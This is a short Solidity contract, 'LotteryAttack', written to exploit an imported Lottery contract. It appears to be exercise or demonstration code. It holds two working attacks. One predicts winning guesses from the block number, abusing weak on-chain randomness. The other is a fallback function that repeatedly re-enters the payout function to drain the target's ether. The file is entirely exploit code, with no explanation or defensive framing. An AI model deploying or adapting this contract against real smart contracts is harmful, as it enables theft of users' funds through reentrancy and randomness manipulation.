pragma solidity 0.6.0;
import "./Lottery.sol";

contract LotteryAttack {
    Lottery public lotteryContract;

    constructor(address payable _reentrancyContractAddress) public {
        lotteryContract = Lottery(_reentrancyContractAddress);
    }

    function guess(address addr) public {
        uint num = block.number;

        lotteryContract.makeAGuess(addr, num % 7);
    }

    function attack() external payable {
        lotteryContract.payoutWinningTeam();
    }

    fallback() external payable {
        if (address(lotteryContract).balance > 0.1 ether) {
            lotteryContract.payoutWinningTeam();
        }
    }

}